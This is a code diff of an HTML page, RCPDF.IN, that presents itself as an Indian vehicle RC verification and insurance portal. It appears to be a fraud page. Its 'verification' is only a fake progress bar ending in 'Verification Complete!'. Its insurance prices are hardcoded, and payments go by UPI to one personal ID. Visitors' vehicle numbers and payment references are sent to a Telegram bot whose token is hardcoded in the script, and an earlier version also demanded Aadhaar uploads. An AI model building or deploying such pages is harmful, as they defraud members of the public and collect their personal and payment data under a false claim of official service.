@@ -3,283 +3,251 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RCPDF.IN - Digital Portal</title>
+    <title>RCPDF.IN - Digital Document Information</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
+        /* --- AAPKA ORIGINAL RC STYLE (UNTOUCHED) --- */
         :root { --primary: #ff0066; --ind-blue: #003399; }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
-        
         body { 
             background: linear-gradient(180deg, #FF9933 0%, #ffffff 40%, #ffffff 60%, #138808 100%);
-            background-attachment: fixed;
-            color: #000; overflow-x: hidden; min-height: 100vh;
+            background-attachment: fixed; color: #000; overflow-x: hidden; min-height: 100vh;
         }
-
-        /* Common Elements */
         .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 3px solid var(--ind-blue); }
-        .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; position: absolute; left: 50%; transform: translateX(-50%); }
+        .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; text-decoration: none; position: absolute; left: 50%; transform: translateX(-50%); }
         .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.98); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
-
-        /* Neon RGB Button */
+        .hsrp-plate { background: #fff; width: 100%; height: 80px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
+        .ind-strip { background: var(--ind-blue); width: 65px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; z-index: 2; position: absolute; left: 0; }
+        .ind-strip img { width: 30px; margin-bottom: 4px; }
+        #vehInput, #insVeh { flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; text-align: center; outline: none; text-transform: uppercase; width: 100%; padding-left: 70px; }
         .neon-btn {
             position: relative; background: #000; color: #fff; font-size: 16px; font-weight: 900;
             padding: 18px; width: 100%; border-radius: 15px; border: none; cursor: pointer;
-            text-transform: uppercase; margin-bottom: 15px; overflow: hidden; display: flex; align-items: center; justify-content: center;
+            text-transform: uppercase; margin-bottom: 25px; overflow: hidden; display: flex; align-items: center; justify-content: center;
         }
         .neon-btn::before {
             content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
             background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
             animation: rotateRGB 2s linear infinite;
         }
-        .neon-btn .btn-text { position: relative; z-index: 2; }
-        .neon-btn::after { content: ''; position: absolute; inset: 4px; background: #000; border-radius: 12px; z-index: 1; }
+        .neon-btn::after { content: 'PAYMENT WITH UPI ❤️'; position: absolute; inset: 4px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; z-index: 1; }
         @keyframes rotateRGB { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-
-        /* Input Styles */
-        .ins-input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 12px; font-size: 16px; font-weight: bold; background: #fff; display: block; }
-        .popup-red { background: #d32f2f; color: #fff; padding: 15px; border-radius: 10px; margin: 10px 0; display: none; font-size: 14px; font-weight: bold; }
-        .type-btn-container { display: flex; gap: 10px; margin-top: 15px; }
-        .type-btn { flex: 1; padding: 15px; border-radius: 10px; border: 2px solid var(--ind-blue); background: #fff; cursor: pointer; font-weight: bold; }
-        .type-btn.active { background: var(--ind-blue); color: #fff; }
-        .file-box { background: #f1f1f1; padding: 10px; border-radius: 10px; border: 1px dashed #666; margin-bottom: 10px; text-align: left; }
         .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
-
-        /* RC Plate */
-        .hsrp-plate { background: #fff; width: 100%; height: 80px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
-        .ind-strip { background: var(--ind-blue); width: 65px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; z-index: 2; position: absolute; left: 0; }
-        #vehInput { flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; text-align: center; outline: none; text-transform: uppercase; width: 100%; padding-left: 70px; }
-        
-        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
         .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; padding: 20px; background: rgba(0, 128, 0, 0.98); }
+        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
+        
+        /* --- INSURANCE EXTRA STYLE --- */
+        .ins-input { width: 100%; padding: 16px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; font-size: 18px; text-align: center; font-weight: bold; }
+        .grid-4 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        .cat-btn { padding: 15px; border-radius: 12px; border: 2px solid var(--ind-blue); background: #fff; font-weight: bold; cursor: pointer; }
+        .cat-btn.active { background: var(--ind-blue); color: #fff; }
     </style>
 </head>
-<body>
+<body onload="renderHistory()">
 
     <div class="header">
         <button style="background:none; border:none; font-size:24px; cursor:pointer;" onclick="location.reload()">🏠</button>
         <b class="logo">RCPDF.IN</b>
-        <button id="backBtn" style="visibility:hidden; background:none; border:none; font-size:20px; cursor:pointer;" onclick="goHome()">🔙</button>
+        <button style="background:none; border:none; font-size:24px; cursor:pointer;" onclick="location.reload()">🏠</button>
     </div>
 
-    <div id="home-section" class="card">
-        <h2 style="color: var(--ind-blue); margin-bottom:15px;">Digital RC Verification</h2>
-        <div class="hsrp-plate">
-            <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg" width="30"><span>IND</span></div>
-            <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13">
+    <div class="card" id="main-rc-card">
+        <div id="p1">
+            <h2 style="margin-bottom:15px; color: var(--ind-blue);">Digital RC Verification</h2>
+            <div class="hsrp-plate">
+                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
+                <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
+            </div>
+            <button class="btn" onclick="go2()">CHECK STATUS</button>
+            
+            <button class="neon-btn" style="margin-top:20px;" onclick="openIns()"></button>
         </div>
-        <button class="btn" onclick="startRCProcess()">CHECK STATUS</button>
+
+        <div id="p2" style="display:none;">
+            <button class="neon-btn" onclick="pay()"></button>
+            <img id="qr" src="" width="160" style="margin-bottom:10px; border:1px solid #ddd; padding:5px;">
+            <input type="tel" id="mob" class="ins-input" placeholder="WhatsApp Number">
+            <input type="tel" id="utr" class="ins-input" placeholder="Enter 12 Digit UTR" maxlength="12">
+            <button class="btn" onclick="submit()">Verify & Generate Receipt</button>
+        </div>
+    </div>
+
+    <div id="ins-flow" class="card" style="display:none;">
+        <h2 style="color:var(--ind-blue); margin-bottom:15px;">Insurance Portal</h2>
         
-        <div style="margin-top: 25px; border-top: 1px solid #ddd; padding-top: 20px;">
-            <button class="neon-btn" onclick="openInsurance()">
-                <span class="btn-text">🛡️ INSURANCE SERVICES</span>
-            </button>
+        <div id="step1">
+            <div class="hsrp-plate">
+                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
+                <input type="text" id="insVeh" placeholder="BR-09-AB-1234" oninput="formatV(this)">
+            </div>
+            <button class="btn" onclick="insStep(2)">NEXT</button>
         </div>
-    </div>
 
-    <div id="ins-step1" class="card" style="display:none;">
-        <h3>Insurance Verification</h3>
-        <input type="tel" id="ins-mob" class="ins-input" placeholder="Enter WhatsApp Number">
-        <input type="text" id="ins-veh" class="ins-input" placeholder="Vehicle Number (BR09...)" style="text-transform:uppercase;">
-        <label style="display:block; text-align:left; font-size:12px; font-weight:bold; margin-top:10px;">Expiry Date:</label>
-        <input type="date" id="ins-date" class="ins-input" onchange="checkExpiry()">
-        <div id="popup-red" class="popup-red">⚠️ Aapki NCB 0 ho sakti hai aur vehicle inspection ki zaroorat pad sakti hai.</div>
-        <label style="display:flex; align-items:center; gap:10px; margin: 15px 0; font-weight:bold;">
-            <input type="checkbox" id="expired-check" onchange="checkExpiry()"> Policy Expired?
-        </label>
-        <button class="btn" onclick="toInsStep2()">NEXT</button>
-    </div>
+        <div id="step2" style="display:none;">
+            <input type="tel" id="insWa" class="ins-input" placeholder="WhatsApp Number" maxlength="10">
+            <button class="btn" onclick="insStep(3)">NEXT</button>
+        </div>
 
-    <div id="ins-step2" class="card" style="display:none;">
-        <h3>Vehicle Selection</h3>
-        <select id="ins-cat" class="ins-input" onchange="loadInsuranceModels()">
-            <option value="">-- Select Category --</option>
-            <option value="bike">Two Wheeler (Bike/Scooter)</option>
-            <option value="car">Private Car</option>
-            <option value="tempo">3-Wheeler / Tempo / Pickup</option>
-            <option value="truck">Commercial Truck (GVW)</option>
-            <option value="tractor">Tractor</option>
-        </select>
-        <select id="ins-model" class="ins-input">
-            <option value="">-- Choose Company & Model --</option>
-        </select>
-        <div class="type-btn-container">
-            <button class="type-btn" id="btn-comp" onclick="setInsType('Comprehensive')">Comprehensive</button>
-            <button class="type-btn" id="btn-tp" onclick="setInsType('Third Party')">Third Party</button>
+        <div id="step3" style="display:none;">
+            <p style="font-weight:bold; margin-bottom:10px;">Select Insurance Type:</p>
+            <div class="grid-4">
+                <button class="cat-btn" id="tp-com" onclick="setPolType('Comprehensive')">Comprehensive</button>
+                <button class="cat-btn" id="tp-tp" onclick="setPolType('Third Party')">Third Party</button>
+            </div>
+            <button class="btn" style="margin-top:15px;" onclick="insStep(4)">NEXT</button>
         </div>
-        <div style="margin-top:20px;">
-            <p style="font-weight:bold; font-size:14px; text-align:left;">Upload Aadhar (Mandatory):</p>
-            <div class="file-box">FRONT: <input type="file" id="adh-f"></div>
-            <div class="file-box">REAR: <input type="file" id="adh-r"></div>
-        </div>
-        <button class="btn" onclick="toInsPay()">PROCEED TO PAY</button>
-    </div>
 
-    <div id="pay-section" class="card" style="display:none;">
-        <h3>Insurance Payment</h3>
-        <div style="background:#fff; padding:15px; border-radius:15px; border:2px solid #eee; margin:15px 0;">
-            <img id="qr-img" src="" width="180">
-            <h2 id="final-amt" style="margin-top:10px; color:var(--ind-blue);"></h2>
-            <p style="font-size:10px; font-weight:bold;">NORMAL PRICE APPLIED</p>
+        <div id="step4" style="display:none;">
+            <p style="font-weight:bold; margin-bottom:10px;">Which type of Vehicle?</p>
+            <div class="grid-4">
+                <button class="cat-btn" onclick="setCat('bike')">BIKE</button>
+                <button class="cat-btn" onclick="setCat('car')">CAR</button>
+                <button class="cat-btn" onclick="setCat('truck')">TRUCK/PICKUP</button>
+                <button class="cat-btn" onclick="setCat('tempo')">TEMPO</button>
+            </div>
         </div>
-        <button class="neon-btn" onclick="triggerUPI()"><span class="btn-text">PAY WITH UPI ❤️</span></button>
-        <input type="tel" id="utr-input" class="ins-input" placeholder="Enter 12 Digit UTR Number" maxlength="12">
-        <button class="btn" onclick="finishIns()">Verify & Download PDF</button>
+
+        <div id="step5" style="display:none;">
+            <select id="brandList" class="ins-input" onchange="loadModels()"></select>
+            <select id="modelList" class="ins-input" onchange="showNormalPrice()"></select>
+            <div id="priceDisplay" style="font-size:22px; font-weight:900; color:green; margin:10px 0;"></div>
+            <button class="btn" onclick="insStep(6)">PROCEED TO PAY</button>
+        </div>
     </div>
 
     <div id="successOverlay" class="overlay">
-        <h1 style="font-size: 50px;">✅</h1>
-        <h1 id="success-title">Verification Complete!</h1>
+        <h1 style="font-size: 40px;">😊</h1>
+        <h1 style="font-size: 30px;">Verification Complete!</h1>
         <button class="btn" id="dlBtn" style="background:#fff; color:green; width:260px; margin-top:25px;">Download Receipt</button>
     </div>
 
-    <div class="loader-wrap" id="load-screen">
-        <div style="font-size:45px;" id="pText">0%</div>
-        <p>🔍 Fetching Database Records...</p>
+    <div class="loader-wrap" id="load">
+        <div style="font-size:40px;" id="pText">0%</div>
+        <p>🔍 Fetching Secure Records...</p>
     </div>
 
     <script>
+        // --- DATA & CONFIG ---
         const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
         const T_CHAT_ID = "5600045707";
-        let selType = ""; let selPrice = 0;
+        let curPol = ""; let curCat = ""; let curAmt = 0;
 
-        const insData = {
-            bike: [
-                {n: "Yamaha / Honda / Hero (0-150cc)", p: 843},
-                {n: "Royal Enfield (Classic/Bullet/Himalayan)", p: 1612},
-                {n: "Bajaj / TVS / Yamaha (150-350cc)", p: 1612},
-                {n: "KTM / RE 650cc Above", p: 3309}
-            ],
-            car: [
-                {n: "Maruti Alto / Hyundai Eon (0-1000cc)", p: 2471},
-                {n: "Swift / Dzire / Kia / Tata (1000-1500cc)", p: 4031},
-                {n: "Fortuner / Scorpio / SUV (>1500cc)", p: 9318}
-            ],
-            tempo: [
-                {n: "3Wheeler Public (Bajaj/Piaggio)", p: 5031},
-                {n: "Pickup / Tempo (Tata/Mahindra)", p: 17975}
-            ],
-            truck: [
-                {n: "GVW Truck (0-7500KGS)", p: 17975},
-                {n: "GVW Truck (7500-12000KGS)", p: 30448},
-                {n: "GVW Truck (12000-20000KGS)", p: 39551}
-            ],
-            tractor: [{n: "Tractor Agriculture", p: 8575}]
+        const brands = {
+            bike: ["Honda", "Hero", "TVS", "Yamaha", "Royal Enfield", "KTM", "Suzuki", "Bajaj"],
+            car: ["Maruti Suzuki", "Hyundai", "Tata Motors", "Mahindra", "Toyota", "Kia", "Honda"],
+            truck: ["Tata Motors", "Ashok Leyland", "Eicher", "Mahindra", "BharatBenz"],
+            tempo: ["Bajaj", "Piaggio", "Mahindra", "Tata"]
         };
 
-        function openInsurance() {
-            document.getElementById('home-section').style.display='none';
-            document.getElementById('ins-step1').style.display='block';
-            document.getElementById('backBtn').style.visibility='visible';
+        const models = {
+            bike: {
+                "Royal Enfield": [{n: "Classic 350 / Bullet (150-350cc)", p: 1612}, {n: "Himalayan (>350cc)", p: 3309}],
+                "Honda": [{n: "Activa / Shine (0-150cc)", p: 843}],
+                "Yamaha": [{n: "R15 / FZ (150-350cc)", p: 1612}]
+            },
+            car: {
+                "Maruti Suzuki": [{n: "Alto / WagonR (0-1000cc)", p: 2471}, {n: "Swift / Dzire (1000-1500cc)", p: 4031}],
+                "Toyota": [{n: "Fortuner / Innova (>1500cc)", p: 9318}]
+            },
+            truck: { "Tata Motors": [{n: "GVW (0-7500KGS)", p: 17975}, {n: "GVW (>12000KGS)", p: 39551}] },
+            tempo: { "Bajaj": [{n: "3Wheeler Public", p: 5031}] }
+        };
+
+        // --- RC FUNCTIONS (AAPKA PEHLE WALA) ---
+        function formatV(i) {
+            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+            let out = "";
+            if (v.length > 0) out += v.substring(0, 2);
+            if (v.length > 2) out += "-" + v.substring(2, 4);
+            if (v.length > 4) out += "-" + v.substring(4, 6);
+            if (v.length > 6) out += "-" + v.substring(6, 10);
+            i.value = out;
         }
 
-        function goHome() { location.reload(); }
-
-        function checkExpiry() {
-            const dt = document.getElementById('ins-date').value;
-            const chk = document.getElementById('expired-check').checked;
-            const pop = document.getElementById('popup-red');
-            if(chk || (dt && new Date(dt) < new Date())) pop.style.display='block';
-            else pop.style.display='none';
+        function go2() {
+            if(document.getElementById('vehInput').value.length < 9) return alert("Enter valid vehicle.");
+            const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC_VERIFY`;
+            document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?data=" + encodeURIComponent(upi);
+            document.getElementById('p1').style.display='none'; document.getElementById('p2').style.display='block';
         }
 
-        function toInsStep2() {
-            if(!document.getElementById('ins-mob').value || !document.getElementById('ins-veh').value) return alert("Details bharo!");
-            document.getElementById('ins-step1').style.display='none';
-            document.getElementById('ins-step2').style.display='block';
+        function submit() {
+            if(document.getElementById('utr').value.length < 12) return alert("Enter 12 Digit UTR.");
+            showLoader("RC");
         }
 
-        function loadInsuranceModels() {
-            const cat = document.getElementById('ins-cat').value;
-            const sel = document.getElementById('ins-model');
-            sel.innerHTML = '<option value="">-- Choose Company & CC --</option>';
-            if(insData[cat]) {
-                insData[cat].forEach(i => {
-                    let o = document.createElement('option'); o.value = i.p; o.text = i.n + " (Normal Price: ₹" + i.p + ")"; sel.add(o);
-                });
-            }
+        // --- INSURANCE FUNCTIONS ---
+        function openIns() {
+            document.getElementById('main-rc-card').style.display='none';
+            document.getElementById('ins-flow').style.display='block';
         }
 
-        function setInsType(t) {
-            selType = t;
-            document.getElementById('btn-comp').classList.remove('active');
-            document.getElementById('btn-tp').classList.remove('active');
+        function insStep(s) {
+            for(let i=1; i<=5; i++) document.getElementById('step'+i).style.display='none';
+            if(s === 6) { startInsPayment(); return; }
+            document.getElementById('step'+s).style.display='block';
+        }
+
+        function setPolType(t) {
+            curPol = t;
+            document.getElementById('tp-com').classList.remove('active');
+            document.getElementById('tp-tp').classList.remove('active');
             event.target.classList.add('active');
         }
 
-        function toInsPay() {
-            selPrice = document.getElementById('ins-model').value;
-            if(!selPrice || !selType || !document.getElementById('adh-f').files[0]) return alert("Selection aur Aadhar mandatory hai!");
-            document.getElementById('ins-step2').style.display='none';
-            document.getElementById('pay-section').style.display='block';
-            document.getElementById('final-amt').innerText = "₹" + selPrice;
-            const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${selPrice}&cu=INR`;
-            document.getElementById('qr-img').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
+        function setCat(c) {
+            curCat = c;
+            const bSel = document.getElementById('brandList');
+            bSel.innerHTML = '<option value="">-- Select Company --</option>';
+            brands[c].forEach(b => bSel.innerHTML += `<option value="${b}">${b}</option>`);
+            insStep(5);
         }
 
-        function triggerUPI() { window.location.href = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${selPrice}&cu=INR`; }
+        function loadModels() {
+            const b = document.getElementById('brandList').value;
+            const mSel = document.getElementById('modelList');
+            mSel.innerHTML = '<option value="">-- Select Model/CC --</option>';
+            if(models[curCat] && models[curCat][b]) {
+                models[curCat][b].forEach(m => mSel.innerHTML += `<option value="${m.p}">${m.n}</option>`);
+            } else { mSel.innerHTML += `<option value="1612">Universal (150-350cc)</option>`; }
+        }
 
-        function finishIns() {
-            const utr = document.getElementById('utr-input').value;
-            if(utr.length < 12) return alert("12 Digit UTR Number enter karein!");
-            document.getElementById('load-screen').style.display='flex';
+        function showNormalPrice() {
+            curAmt = document.getElementById('modelList').value;
+            document.getElementById('priceDisplay').innerText = "Normal Price: ₹" + curAmt;
+        }
+
+        function startInsPayment() {
+            document.getElementById('ins-flow').style.display='none';
+            document.getElementById('main-rc-card').style.display='block';
+            document.getElementById('p1').style.display='none';
+            document.getElementById('p2').style.display='block';
+            const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${curAmt}&cu=INR&tn=INSURANCE`;
+            document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?data=" + encodeURIComponent(upi);
+        }
+
+        // --- UTILS ---
+        function showLoader(type) {
+            document.getElementById('load').style.display='flex';
             let p = 0;
             let iv = setInterval(() => {
                 p += 5; document.getElementById('pText').innerText = p + "%";
                 if(p >= 100) {
                     clearInterval(iv);
-                    const msg = `🛡️ *NEW INSURANCE ORDER*\n🚗 *Veh:* ${document.getElementById('ins-veh').value}\n📱 *Mob:* ${document.getElementById('ins-mob').value}\n📋 *Type:* ${selType}\n📦 *Model:* ${document.getElementById('ins-model').options[document.getElementById('ins-model').selectedIndex].text}\n💰 *Amt:* ₹${selPrice}\n🔢 *UTR:* ${utr}`;
-                    fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage?chat_id=${T_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-                    document.getElementById('load-screen').style.display='none';
+                    sendTele(type);
+                    document.getElementById('load').style.display='none';
                     document.getElementById('successOverlay').style.display='flex';
-                    document.getElementById('dlBtn').onclick = () => generatePDF("INS", utr);
+                    document.getElementById('dlBtn').onclick = () => location.reload();
                 }
             }, 100);
         }
 
-        // RC SECTION FUNCTIONS
-        function startRCProcess() {
-            if(document.getElementById('vehInput').value.length < 9) return alert("Invalid Vehicle Number!");
-            document.getElementById('load-screen').style.display='flex';
-            let p = 0;
-            let iv = setInterval(() => {
-                p += 2; document.getElementById('pText').innerText = p + "%";
-                if(p >= 100) {
-                    clearInterval(iv);
-                    document.getElementById('load-screen').style.display='none';
-                    alert("Record Found! For full verification, please use payment gateway.");
-                }
-            }, 50);
-        }
-
-        function generatePDF(type, utr) {
-            const { jsPDF } = window.jspdf;
-            const doc = new jsPDF();
-            doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
-            doc.setTextColor(255); doc.setFontSize(22);
-            doc.text(type === "INS" ? "INSURANCE PAYMENT RECEIPT" : "RC VERIFICATION RECEIPT", 105, 25, null, null, "center");
-            
-            doc.setTextColor(0); doc.setFontSize(12);
-            let y = 50;
-            const veh = type === "INS" ? document.getElementById('ins-veh').value : document.getElementById('vehInput').value;
-            const mob = type === "INS" ? document.getElementById('ins-mob').value : "N/A";
-            
-            const dataRow = [
-                ["VEHICLE NO:", veh.toUpperCase()],
-                ["SERVICE TYPE:", type === "INS" ? "INSURANCE" : "RC VERIFY"],
-                ["MOBILE NO:", mob],
-                ["UTR NUMBER:", utr],
-                ["AMOUNT:", "INR " + selPrice]
-            ];
-            
-            dataRow.forEach(row => {
-                doc.rect(15, y, 180, 10); doc.text(row[0], 20, y + 7); doc.text(row[1], 85, y + 7);
-                y += 10;
-            });
-            
-            doc.text("Thank you for choosing RCPDF.IN", 105, y + 30, null, null, "center");
-            doc.save("Receipt_" + veh + ".pdf");
-            setTimeout(() => location.reload(), 1000);
+        function sendTele(type) {
+            const utr = document.getElementById('utr').value;
+            const v = (type === "RC") ? document.getElementById('vehInput').value : document.getElementById('insVeh').value;
+            const cap = `✅ *${type} ORDER*\n🚗 *Veh:* ${v}\n🔢 *UTR:* ${utr}\n💰 *Amt:* ₹${(type==="RC") ? '120' : curAmt}`;
+            fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage?chat_id=${T_CHAT_ID}&text=${encodeURIComponent(cap)}&parse_mode=Markdown`);
         }
     </script>
 </body>
